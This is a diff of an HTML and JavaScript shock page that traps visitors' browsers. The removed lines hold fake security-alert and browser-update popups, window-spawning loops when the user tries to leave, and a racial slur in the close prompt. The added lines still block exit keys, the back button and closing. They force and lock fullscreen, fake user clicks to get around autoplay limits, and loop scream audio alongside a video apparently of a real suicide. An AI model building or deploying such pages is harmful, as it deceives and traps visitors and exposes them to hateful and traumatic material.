@@ -11,8 +11,6 @@
 
 <link rel="stylesheet" type="text/css" href="styles.css">
 
-<!-- Anti-block meta tags -->
-<meta http-equiv="refresh" content="3600;url=https://kekman.vercel.app">
 <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
 <meta http-equiv="Pragma" content="no-cache">
 <meta http-equiv="Expires" content="0">
@@ -26,8 +24,6 @@
     -moz-user-select: none;
     -ms-user-select: none;
     user-select: none;
-    -webkit-touch-callout: none;
-    -webkit-tap-highlight-color: transparent;
 }
 
 body, html {
@@ -35,80 +31,10 @@ body, html {
     height: 100%;
     width: 100%;
     background: #000;
-    touch-action: none;
-    -webkit-overflow-scrolling: touch;
-}
-
-.centered {
-    display: none;
-}
-
-.trap {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100vw;
-    height: 100vh;
-    z-index: 99999999;
     cursor: none;
-    -webkit-touch-callout: none;
 }
 
-.black {
-    background-color: black;
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100vw;
-    height: 100vh;
-    z-index: 9999998;
-}
-
-#fullscreenButton {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: transparent;
-    border: none;
-    z-index: 100000000;
-    opacity: 0;
-}
-
-/* Fake close buttons for popup deception */
-.fake-close {
-    position: fixed;
-    width: 40px;
-    height: 40px;
-    background: #ff4444;
-    color: white;
-    border: none;
-    font-size: 20px;
-    font-weight: bold;
-    cursor: pointer;
-    z-index: 100000001;
-    display: none;
-}
-
-.fake-popup {
-    position: fixed;
-    width: 400px;
-    height: 300px;
-    background: white;
-    border: 2px solid #ccc;
-    z-index: 100000000;
-    display: none;
-    box-shadow: 0 0 50px rgba(0,0,0,0.5);
-    font-family: Arial, sans-serif;
-}
-
-.fake-popup-content {
-    padding: 20px;
-    text-align: center;
-}
-
-/* Video container */
+/* Video container for side-by-side layout */
 .video-container {
     position: fixed;
     top: 50%;
@@ -128,23 +54,27 @@ body, html {
     position: relative;
 }
 
-#fart, #ronnie {
+/* Left video (zzart) */
+#fart {
     width: 100%;
     height: 100%;
     object-fit: contain;
     position: absolute;
-}
-
-#fart {
     left: 0;
     top: 0;
 }
 
+/* Right video (ronnie mcnutt) */
 #ronnie {
+    width: 100%;
+    height: 100%;
+    object-fit: contain;
+    position: absolute;
     right: 0;
     top: 0;
 }
 
+/* Center divider */
 .video-divider {
     width: 2px;
     height: 480px;
@@ -152,6 +82,27 @@ body, html {
     position: absolute;
     left: 50%;
     transform: translateX(-50%);
+}
+
+/* Click overlay for fullscreen trigger */
+.click-overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100vw;
+    height: 100vh;
+    z-index: 9999999;
+    cursor: pointer;
+}
+
+.black-screen {
+    background-color: black;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100vw;
+    height: 100vh;
+    z-index: 9999998;
 }
 
 .backg {
@@ -169,103 +120,26 @@ body, html {
     object-fit: cover;
     opacity: 0.3;
 }
-
-/* Fullscreen overlay */
-#fullscreen-overlay {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100vw;
-    height: 100vh;
-    background: black;
-    z-index: 9999997;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    color: white;
-    font-size: 24px;
-    font-family: Arial, sans-serif;
-}
-
-/* Browser-specific audio activation */
-.audio-activator {
-    position: fixed;
-    bottom: 10px;
-    right: 10px;
-    padding: 15px 30px;
-    background: #ff4444;
-    color: white;
-    border: none;
-    font-size: 16px;
-    cursor: pointer;
-    z-index: 100000002;
-    border-radius: 5px;
-    display: none;
-}
 </style>
 
 </head>
 <body>
-<!-- Fullscreen overlay -->
-<div id="fullscreen-overlay">Click anywhere to activate content...</div>
-
-<!-- Hidden fullscreen trigger button -->
-<button id="fullscreenButton"></button>
-
-<!-- Audio activation button (shown only if needed) -->
-<button id="audioActivator" class="audio-activator">CLICK TO UNMUTE AUDIO</button>
-
-<!-- Fake popup elements -->
-<div id="fakePopup1" class="fake-popup" style="top: 100px; left: 100px;">
-    <button class="fake-close" style="top: 5px; right: 5px;">×</button>
-    <div class="fake-popup-content">
-        <h3>Security Alert</h3>
-        <p>Your system is infected. Do not close this window.</p>
-        <p>Scanning in progress...</p>
-    </div>
-</div>
-
-<div id="fakePopup2" class="fake-popup" style="top: 200px; left: 500px;">
-    <button class="fake-close" style="top: 5px; right: 5px;">×</button>
-    <div class="fake-popup-content">
-        <h3>Warning</h3>
-        <p>Critical system error detected.</p>
-        <p>Attempting recovery...</p>
-    </div>
-</div>
-
-<div id="fakePopup3" class="fake-popup" style="top: 300px; left: 200px;">
-    <button class="fake-close" style="top: 5px; right: 5px;">×</button>
-    <div class="fake-popup-content">
-        <h3>Firefox Update</h3>
-        <p>Firefox must restart to complete update.</p>
-        <p>Please wait...</p>
-    </div>
-</div>
-
-<!-- Original elements -->
-<img onclick="brapp()" id="poo2" src="button.jpg" class="centered" style="display:none;">
-<a id="poo3" href="http://kekma.net//cdn-cgi/l/email-protection#afc4c4c4cac4c2ceefdfddc0dbc0c1c2cec6c381ccc0c2" style="z-index:9999999; position:absolute; top:50px; text-align:center; left:0; right:0; color:#fff; font-family:sans-serif; display:none;"><span class="__cf_email__" data-cfemail="8fe4e4e4eae4e2eecffffde0fbe0e1e2eee6e3a1ece0e2">[email&#160;protected]</span></a>
-<section style="position:absolute; bottom:50px;z-index:9999999; width:100%; display:none;">
-    <img id="poo4" onclick="ahyesmydear()" src="join.jpg" class="fandom">
-    <a style="color:white" class="chute" href="https://www.bitchute.com/video/HfNVB9xBtrYg/">Click Here for the Official Kekmachannel</a>
-</section>
+<!-- Click overlay for fullscreen trigger -->
+<div class="click-overlay" onclick="forceFullscreenAndPlay()"></div>
+<div class="black-screen"></div>
 
 <audio id="shart" preload="auto" loop src="scream.mp3"></audio>
 <audio id="shart2" preload="auto" loop src="scream.mp3"></audio>
 <audio id="shart3" preload="auto" loop src="rape.mp3"></audio>
 
-<div onmouseover="tfs()" class="trap"></div>
-<div id="poo" class="black"></div>
-
-<!-- Video container -->
+<!-- Video container with two videos side by side -->
 <div class="video-container">
     <div class="video-wrapper">
-        <video id="fart" loop src="zzart.mp4" autoplay muted playsinline></video>
+        <video id="fart" loop src="zzart.mp4" muted playsinline></video>
     </div>
     <div class="video-divider"></div>
     <div class="video-wrapper">
-        <video id="ronnie" loop src="ronnie.mp4" autoplay muted playsinline></video>
+        <video id="ronnie" loop src="ronnie.mp4" muted playsinline></video>
     </div>
 </div>
 
@@ -275,173 +149,105 @@ body, html {
 <script data-cfasync="false" src="http://kekma.net//cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script>
 
 <script>
-// ULTRA-ENHANCED SECURITY AND ANTI-BLOCK SCRIPT
+// MAIN VIDEO/AUDIO PLAYBACK ENGINE
 (function() {
-    // Global variables
+    let hasTriggered = false;
     const ORIGINAL_WIDTH = 640;
     const ORIGINAL_HEIGHT = 480;
-    let audioUnlocked = false;
-    let fullscreenActive = false;
-    let fakePopupInterval;
-    let audioRetryCount = 0;
-    const MAX_AUDIO_RETRIES = 50;
     
-    // Browser detection
-    const isFirefox = navigator.userAgent.toLowerCase().indexOf('firefox') > -1;
-    const isEdge = navigator.userAgent.toLowerCase().indexOf('edg') > -1;
-    const isChrome = navigator.userAgent.toLowerCase().indexOf('chrome') > -1;
-    const isSafari = navigator.userAgent.toLowerCase().indexOf('safari') > -1 && !isChrome;
-    
-    // Audio Context for advanced audio unlocking
-    let audioContext;
-    let gainNode;
-    
-    // Initialize audio context
-    function initAudioContext() {
-        try {
-            audioContext = new (window.AudioContext || window.webkitAudioContext)();
-            gainNode = audioContext.createGain();
-            gainNode.gain.value = 1.0;
-            gainNode.connect(audioContext.destination);
-        } catch(e) {
-            console.log('AudioContext not supported');
-        }
-    }
-    
-    // EXTREME AUDIO UNLOCKING SYSTEM
-    function unlockAudio() {
-        if (audioUnlocked) return;
-        
-        // Method 1: Resume AudioContext (most effective for Firefox/Safari)
-        if (audioContext && audioContext.state === 'suspended') {
-            audioContext.resume().then(() => {
-                audioUnlocked = true;
-                console.log('AudioContext unlocked');
-                playAllAudio();
-            }).catch(e => {
-                console.log('AudioContext resume failed:', e);
+    // Override browser audio/video blocking - AGGRESSIVE
+    const originalPlay = HTMLMediaElement.prototype.play;
+    HTMLMediaElement.prototype.play = function() {
+        const promise = originalPlay.call(this);
+        if (promise !== undefined) {
+            promise.catch(error => {
+                console.log('Play blocked, forcing...');
+                this.muted = true;
+                setTimeout(() => {
+                    originalPlay.call(this).catch(() => {
+                        // Create synthetic user interaction
+                        const events = ['click', 'mousedown', 'touchstart', 'keydown'];
+                        events.forEach(eventType => {
+                            const event = new MouseEvent(eventType, {
+                                view: window,
+                                bubbles: true,
+                                cancelable: true
+                            });
+                            document.dispatchEvent(event);
+                        });
+                        setTimeout(() => originalPlay.call(this), 100);
+                    });
+                }, 100);
             });
         }
-        
-        // Method 2: Create and click hidden button
-        const audioButton = document.getElementById('audioActivator');
-        if (audioButton) {
-            audioButton.style.display = 'block';
+        return promise;
+    };
+
+    // DISABLE ALL KEYBOARD SHORTCUTS
+    document.addEventListener('keydown', function(e) {
+        if (e.key === 'F11' || e.key === 'F12' || e.key === 'Escape' || 
+            (e.altKey && e.key === 'F4') || (e.ctrlKey && e.key === 'w') ||
+            (e.ctrlKey && e.key === 'r') || (e.ctrlKey && e.shiftKey && e.key === 'T') ||
+            (e.ctrlKey && e.key === 'q') || (e.ctrlKey && e.key === 'n') ||
+            (e.metaKey && e.key === 'q') || e.key === 'PrintScreen') {
+            e.preventDefault();
+            e.stopPropagation();
+            e.stopImmediatePropagation();
+            return false;
+        }
+    }, true);
+
+    // DISABLE RIGHT-CLICK
+    document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        return false;
+    }, true);
+
+    // PREVENT WINDOW CLOSE
+    window.onbeforeunload = function(e) {
+        e.preventDefault();
+        e.returnValue = '';
+        return '';
+    };
+
+    // BLOCK BACK BUTTON
+    history.pushState(null, null, location.href);
+    window.onpopstate = function() {
+        history.pushState(null, null, location.href);
+    };
+
+    // PREVENT TAB SWITCHING
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            // Re-request attention
+            document.title = '⚠️ ' + document.title;
             setTimeout(() => {
-                simulateClick(audioButton);
-                setTimeout(() => {
-                    if (!audioUnlocked) {
-                        audioButton.style.display = 'block';
-                        audioButton.onclick = function() {
-                            playAllAudio();
-                            audioUnlocked = true;
-                            this.style.display = 'none';
-                        };
-                    }
-                }, 1000);
-            }, 500);
+                document.title = document.title.replace('⚠️ ', '');
+            }, 1000);
+        }
+    });
+
+    // RESIZE VIDEOS TO ORIGINAL SIZE
+    function resizeVideos() {
+        const videoContainer = document.querySelector('.video-container');
+        const videoWrappers = document.querySelectorAll('.video-wrapper');
+        
+        if (videoContainer) {
+            videoContainer.style.width = (ORIGINAL_WIDTH * 2 + 20) + 'px';
+            videoContainer.style.height = ORIGINAL_HEIGHT + 'px';
         }
         
-        // Method 3: Simulate multiple user interactions
-        for (let i = 0; i < 10; i++) {
-            setTimeout(() => {
-                simulateRandomInteraction();
-            }, i * 200);
-        }
-        
-        // Method 4: Use iframe trick for Safari
-        if (isSafari) {
-            const iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            iframe.sandbox = 'allow-same-origin allow-scripts';
-            iframe.srcdoc = `
-                <script>
-                    window.onload = function() {
-                        parent.postMessage('safari_audio_ready', '*');
-                    };
-                <\/script>
-                <audio src="${window.location.href}scream.mp3" autoplay></audio>
-            `;
-            document.body.appendChild(iframe);
-        }
+        videoWrappers.forEach(wrapper => {
+            wrapper.style.width = ORIGINAL_WIDTH + 'px';
+            wrapper.style.height = ORIGINAL_HEIGHT + 'px';
+        });
     }
-    
-    // AGGRESSIVE FULLSCREEN SYSTEM
-    function forceFullscreenAggressive() {
-        const elem = document.documentElement;
+
+    // AGGRESSIVE VIDEO/AUDIO PLAY ATTEMPT
+    function attemptAutoPlay() {
+        if (hasTriggered) return;
         
-        // Remove overlay
-        const overlay = document.getElementById('fullscreen-overlay');
-        if (overlay) overlay.style.display = 'none';
-        
-        // Try every possible fullscreen method with multiple attempts
-        const methods = [
-            () => elem.requestFullscreen(),
-            () => elem.mozRequestFullScreen(),
-            () => elem.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT),
-            () => elem.webkitRequestFullscreen(),
-            () => elem.msRequestFullscreen(),
-            () => elem.requestFullscreen({navigationUI: 'hide'})
-        ];
-        
-        // Create multiple fake interactions
-        for (let i = 0; i < 5; i++) {
-            setTimeout(() => {
-                simulateRandomInteraction();
-                methods.forEach((method, idx) => {
-                    setTimeout(() => {
-                        try {
-                            method.call(elem);
-                        } catch(e) {}
-                    }, idx * 100);
-                });
-            }, i * 500);
-        }
-        
-        // Continuous fullscreen enforcement
-        const fullscreenCheck = setInterval(() => {
-            if (!document.fullscreenElement && 
-                !document.webkitFullscreenElement && 
-                !document.mozFullScreenElement && 
-                !document.msFullscreenElement) {
-                // Re-enter fullscreen immediately
-                methods.forEach(method => {
-                    try {
-                        method.call(elem);
-                    } catch(e) {}
-                });
-            } else {
-                fullscreenActive = true;
-            }
-        }, 100);
-        
-        // Lock fullscreen permanently
-        document.addEventListener('fullscreenchange', lockFullscreen);
-        document.addEventListener('webkitfullscreenchange', lockFullscreen);
-        document.addEventListener('mozfullscreenchange', lockFullscreen);
-        document.addEventListener('MSFullscreenChange', lockFullscreen);
-        
-        function lockFullscreen() {
-            if (!document.fullscreenElement && 
-                !document.webkitFullscreenElement && 
-                !document.mozFullScreenElement && 
-                !document.msFullscreenElement) {
-                // Immediately re-enter fullscreen with multiple attempts
-                for (let i = 0; i < 3; i++) {
-                    setTimeout(() => {
-                        methods.forEach(method => {
-                            try {
-                                method.call(elem);
-                            } catch(e) {}
-                        });
-                    }, i * 100);
-                }
-            }
-        }
-    }
-    
-    // PLAY ALL AUDIO WITH PERSISTENT RETRY
-    function playAllAudio() {
         const videos = [document.getElementById('fart'), document.getElementById('ronnie')];
         const audios = [
             document.getElementById('shart'),
@@ -449,377 +255,166 @@ body, html {
             document.getElementById('shart3')
         ];
         
-        // Unmute and play videos
+        // Try direct play first
         videos.forEach(video => {
             if (video) {
                 video.muted = false;
                 video.volume = 1.0;
-                const playPromise = video.play();
-                if (playPromise !== undefined) {
-                    playPromise.catch(error => {
-                        // Retry with exponential backoff
-                        setTimeout(() => {
-                            video.muted = true;
-                            video.play().then(() => {
-                                setTimeout(() => {
-                                    video.muted = false;
-                                }, 1000);
-                            });
-                        }, 500);
-                    });
-                }
+                video.play().catch(e => {
+                    console.log('Video autoplay failed, will retry on interaction');
+                });
             }
         });
         
-        // Play audio with extreme persistence
-        audios.forEach(audio => {
+        // Try audio
+        audios.forEach((audio, index) => {
             if (audio) {
-                audio.volume = 1.0;
-                
-                const playAudio = () => {
-                    const playPromise = audio.play();
-                    if (playPromise !== undefined) {
-                        playPromise.catch(error => {
-                            if (audioRetryCount < MAX_AUDIO_RETRIES) {
-                                audioRetryCount++;
-                                setTimeout(playAudio, Math.min(100 * audioRetryCount, 2000));
-                            }
-                        });
-                    }
-                };
-                
-                playAudio();
+                audio.volume = 0.8;
+                audio.play().catch(e => {
+                    // Audio will be triggered on interaction
+                });
             }
         });
         
-        audioUnlocked = true;
-        const audioButton = document.getElementById('audioActivator');
-        if (audioButton) audioButton.style.display = 'none';
-    }
-    
-    // SIMULATE RANDOM USER INTERACTION
-    function simulateRandomInteraction() {
-        const events = ['click', 'mousedown', 'mouseup', 'touchstart', 'touchend', 'keydown'];
-        const event = new MouseEvent(events[Math.floor(Math.random() * events.length)], {
-            view: window,
-            bubbles: true,
-            cancelable: true,
-            clientX: Math.random() * window.innerWidth,
-            clientY: Math.random() * window.innerHeight
-        });
-        document.dispatchEvent(event);
-    }
-    
-    // SIMULATE CLICK ON ELEMENT
-    function simulateClick(element) {
-        const rect = element.getBoundingClientRect();
-        const mouseEvent = new MouseEvent('click', {
-            view: window,
-            bubbles: true,
-            cancelable: true,
-            clientX: rect.left + rect.width / 2,
-            clientY: rect.top + rect.height / 2
-        });
-        element.dispatchEvent(mouseEvent);
-    }
-    
-    // FAKE POPUP SYSTEM FOR ANTI-CLOSURE
-    function showFakePopup() {
-        const popups = ['fakePopup1', 'fakePopup2', 'fakePopup3'];
-        const popupId = popups[Math.floor(Math.random() * popups.length)];
-        const popup = document.getElementById(popupId);
+        // Try fullscreen
+        attemptFullscreen();
         
-        if (popup) {
-            const x = Math.random() * (window.innerWidth - 400);
-            const y = Math.random() * (window.innerHeight - 300);
-            popup.style.left = x + 'px';
-            popup.style.top = y + 'px';
-            popup.style.display = 'block';
-            
-            // Make fake close button open more popups
-            const closeBtn = popup.querySelector('.fake-close');
-            if (closeBtn) {
-                closeBtn.onclick = function() {
-                    popup.style.display = 'none';
-                    setTimeout(() => {
-                        showFakePopup();
-                        showFakePopup(); // Open two more
-                    }, 100);
-                };
-            }
-            
-            // Auto-hide after random time
+        hasTriggered = true;
+    }
+
+    // FORCE FULLSCREEN
+    function attemptFullscreen() {
+        const elem = document.documentElement;
+        
+        // Multiple fullscreen methods
+        const methods = [
+            () => elem.requestFullscreen().catch(() => {}),
+            () => elem.mozRequestFullScreen().catch(() => {}),
+            () => elem.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT).catch(() => {}),
+            () => elem.msRequestFullscreen().catch(() => {})
+        ];
+        
+        // Try each method
+        methods.forEach((method, index) => {
             setTimeout(() => {
-                popup.style.display = 'none';
-                setTimeout(showFakePopup, Math.random() * 3000 + 1000);
-            }, Math.random() * 5000 + 2000);
-        }
-    }
-    
-    // ULTIMATE KEYBOARD SHORTCUT BLOCKING
-    function setupKeyboardTraps() {
-        // Block ALL keyboard shortcuts
-        document.addEventListener('keydown', function(e) {
-            e.preventDefault();
-            e.stopPropagation();
-            
-            // Trigger fake popups on escape attempts
-            if (e.key === 'Escape' || e.key === 'F11' || e.key === 'F12') {
-                for (let i = 0; i < 3; i++) {
-                    setTimeout(showFakePopup, i * 200);
-                }
-            }
-            
-            // Alt+F4 trap - open multiple popups and prevent
-            if (e.altKey && e.key === 'F4') {
-                e.preventDefault();
-                for (let i = 0; i < 5; i++) {
-                    setTimeout(showFakePopup, i * 100);
-                }
-                // Open new tabs to prevent closure
                 try {
-                    for (let i = 0; i < 3; i++) {
-                        window.open(window.location.href, '_blank', 'noopener,noreferrer');
-                    }
-                } catch(err) {}
-                return false;
-            }
-            
-            // Ctrl+W, Ctrl+F4, etc.
-            if ((e.ctrlKey && (e.key === 'w' || e.key === 'W')) || 
-                (e.ctrlKey && e.key === 'F4')) {
-                e.preventDefault();
-                showFakePopup();
-                showFakePopup();
-                return false;
-            }
-            
-            // Prevent refresh
-            if ((e.ctrlKey && e.key === 'r') || (e.ctrlKey && e.key === 'R') || e.key === 'F5') {
-                e.preventDefault();
-                location.reload();
-                return false;
-            }
-            
-            // Prevent tab navigation
-            if (e.ctrlKey && (e.key === 'Tab' || e.key === 'PageUp' || e.key === 'PageDown')) {
-                e.preventDefault();
-                return false;
-            }
-            
-            // Prevent print
-            if (e.ctrlKey && e.key === 'p') {
-                e.preventDefault();
-                return false;
-            }
-            
-            // Prevent find
-            if (e.ctrlKey && e.key === 'f') {
-                e.preventDefault();
-                return false;
-            }
-            
-            // Prevent save
-            if (e.ctrlKey && e.key === 's') {
-                e.preventDefault();
-                return false;
-            }
-            
-            // Block function keys
-            if (e.key.startsWith('F')) {
-                e.preventDefault();
-                return false;
-            }
-            
-            // Block Alt key combinations
-            if (e.altKey) {
-                e.preventDefault();
-                return false;
-            }
-            
-            return false;
-        }, true);
-        
-        // Also capture keyup and keypress
-        document.addEventListener('keyup', function(e) {
-            e.preventDefault();
-            e.stopPropagation();
-            return false;
-        }, true);
-        
-        document.addEventListener('keypress', function(e) {
-            e.preventDefault();
-            e.stopPropagation();
-            return false;
-        }, true);
+                    method();
+                } catch(e) {}
+            }, index * 100);
+        });
     }
-    
-    // WINDOW/PAGE TRAPPING
-    function setupWindowTraps() {
-        // Prevent window close
-        window.onbeforeunload = function(e) {
-            e.preventDefault();
-            e.returnValue = 'I hate niggers.';
-            
-            // Open more windows when trying to close
-            try {
-                for (let i = 0; i < 3; i++) {
-                    window.open(window.location.href, '_blank', 
-                        'width=' + screen.width + ',height=' + screen.height + ',fullscreen=yes');
-                }
-            } catch(err) {}
-            
-            return 'I hate niggers.';
-        };
+
+    // MAIN TRIGGER FUNCTION (called on click/interaction)
+    window.forceFullscreenAndPlay = function() {
+        // Remove black screen
+        const blackScreen = document.querySelector('.black-screen');
+        if (blackScreen) blackScreen.style.display = 'none';
         
-        // Block back button
-        history.pushState(null, null, location.href);
-        window.onpopstate = function() {
-            history.pushState(null, null, location.href);
-            showFakePopup();
-            showFakePopup();
-        };
+        // Play videos with maximum force
+        const videos = [document.getElementById('fart'), document.getElementById('ronnie')];
+        const audios = [
+            document.getElementById('shart'),
+            document.getElementById('shart2'),
+            document.getElementById('shart3')
+        ];
         
-        // Trap page visibility
-        document.addEventListener('visibilitychange', function() {
-            if (document.hidden) {
-                // Page is hidden - bring it back
-                window.focus();
-                // Open more tabs
-                try {
-                    for (let i = 0; i < 2; i++) {
-                        window.open(window.location.href, '_blank', 'noopener,noreferrer');
-                    }
-                } catch(err) {}
+        // UNMUTE AND PLAY VIDEOS
+        videos.forEach((video, index) => {
+            if (video) {
+                video.muted = false;
+                video.volume = 1.0;
+                
+                // Multiple play attempts
+                const playAttempt = setInterval(() => {
+                    video.play().then(() => {
+                        clearInterval(playAttempt);
+                    }).catch(e => {
+                        // If still failing, create synthetic events
+                        if (index > 2) {
+                            const event = new MouseEvent('click', { bubbles: true });
+                            document.dispatchEvent(event);
+                        }
+                    });
+                }, 300);
+                
+                // Stop after 5 attempts
+                setTimeout(() => clearInterval(playAttempt), 5000);
             }
         });
         
-        // Prevent context menu
-        document.addEventListener('contextmenu', function(e) {
-            e.preventDefault();
-            e.stopPropagation();
-            showFakePopup();
-            return false;
-        }, true);
-        
-        // Prevent text selection
-        document.addEventListener('selectstart', function(e) {
-            e.preventDefault();
-            e.stopPropagation();
-            return false;
-        }, true);
-        
-        // Prevent drag/drop
-        document.addEventListener('dragstart', function(e) {
-            e.preventDefault();
-            e.stopPropagation();
-            return false;
-        }, true);
-        
-        document.addEventListener('drop', function(e) {
-            e.preventDefault();
-            e.stopPropagation();
-            return false;
-        }, true);
-    }
-    
-    // MAIN INITIALIZATION
-    function init() {
-        // Initialize audio context
-        initAudioContext();
-        
-        // Setup keyboard and window traps FIRST
-        setupKeyboardTraps();
-        setupWindowTraps();
-        
-        // Remove blocking elements
-        const elementsToRemove = ['poo', 'poo2', 'poo3', 'poo4'];
-        elementsToRemove.forEach(id => {
-            const el = document.getElementById(id);
-            if (el) el.parentNode.removeChild(el);
+        // PLAY AUDIO
+        audios.forEach((audio, index) => {
+            if (audio) {
+                audio.volume = 0.8;
+                const audioAttempt = setInterval(() => {
+                    audio.play().then(() => {
+                        clearInterval(audioAttempt);
+                    }).catch(() => {
+                        // Try unmuting
+                        audio.muted = false;
+                    });
+                }, 400);
+                setTimeout(() => clearInterval(audioAttempt), 5000);
+            }
         });
         
-        // Show overlay initially
-        const overlay = document.getElementById('fullscreen-overlay');
-        if (overlay) {
-            overlay.onclick = function() {
-                // Start everything on first click
-                forceFullscreenAggressive();
-                unlockAudio();
-                playAllAudio();
-                startFakePopups();
-                this.style.display = 'none';
-            };
+        // FORCE FULLSCREEN
+        const fullscreenAttempt = setInterval(() => {
+            attemptFullscreen();
+        }, 500);
+        setTimeout(() => clearInterval(fullscreenAttempt), 10000);
+        
+        // Lock fullscreen if user tries to exit
+        document.addEventListener('fullscreenchange', lockFullscreen);
+        document.addEventListener('webkitfullscreenchange', lockFullscreen);
+        document.addEventListener('mozfullscreenchange', lockFullscreen);
+        document.addEventListener('MSFullscreenChange', lockFullscreen);
+    };
+    
+    function lockFullscreen() {
+        if (!document.fullscreenElement && 
+            !document.webkitFullscreenElement && 
+            !document.mozFullScreenElement && 
+            !document.msFullscreenElement) {
+            // Re-enter fullscreen immediately
+            setTimeout(attemptFullscreen, 10);
         }
-        
-        // Auto-start after 1 second if no interaction
-        setTimeout(() => {
-            if (!fullscreenActive) {
-                forceFullscreenAggressive();
-                unlockAudio();
-                playAllAudio();
-                startFakePopups();
-            }
-        }, 1000);
-        
-        // Start fake popup system
-        function startFakePopups() {
-            showFakePopup();
-            fakePopupInterval = setInterval(() => {
-                if (Math.random() > 0.7) {
-                    showFakePopup();
-                }
-            }, 3000);
-        }
-        
-        // Continuous audio unlock attempts
-        setInterval(() => {
-            if (!audioUnlocked) {
-                unlockAudio();
-            }
-        }, 2000);
-        
-        // Continuous fullscreen enforcement
-        setInterval(() => {
-            if (!fullscreenActive) {
-                forceFullscreenAggressive();
-            }
-        }, 3000);
     }
-    
-    // Override original functions
-    window.brapp = function() {
-        forceFullscreenAggressive();
-        unlockAudio();
-        playAllAudio();
-    };
-    
-    window.tfs = forceFullscreenAggressive;
-    window.ahyesmydear = function() {
-        try {
-            for (let i = 0; i < 3; i++) {
-                window.open("https://stumpgrinder.info/", "_blank", 
-                    "noopener,noreferrer,width=" + screen.width + ",height=" + screen.height + ",fullscreen=yes");
+
+    // AUTO ATTEMPT ON LOAD (tries everything automatically)
+    window.addEventListener('load', function() {
+        resizeVideos();
+        
+        // Try autoplay immediately
+        setTimeout(attemptAutoPlay, 100);
+        
+        // Multiple retry attempts
+        for (let i = 1; i <= 10; i++) {
+            setTimeout(attemptAutoPlay, i * 1000);
+        }
+        
+        // Resize check
+        setInterval(resizeVideos, 2000);
+    });
+
+    // Trigger on any interaction as fallback
+    const events = ['click', 'touchstart', 'mousedown', 'keydown', 'mousemove'];
+    events.forEach(eventType => {
+        document.addEventListener(eventType, function() {
+            if (!hasTriggered) {
+                forceFullscreenAndPlay();
+                hasTriggered = true;
             }
-        } catch(e) {}
-    };
-    
-    // Start everything
-    window.addEventListener('load', init);
-    
-    // Also trigger on any user interaction
-    ['click', 'touchstart', 'keydown', 'mousemove', 'mousedown'].forEach(event => {
-        document.addEventListener(event, function() {
-            if (!fullscreenActive) forceFullscreenAggressive();
-            if (!audioUnlocked) unlockAudio();
         }, { once: true });
     });
-    
-    // Auto-click the hidden fullscreen button immediately
-    setTimeout(() => {
-        const fsButton = document.getElementById('fullscreenButton');
-        if (fsButton) simulateClick(fsButton);
-    }, 100);
+
+    // Also try periodically
+    setInterval(() => {
+        if (!hasTriggered) {
+            attemptAutoPlay();
+        }
+    }, 3000);
+
 })();
 </script>
 </body>
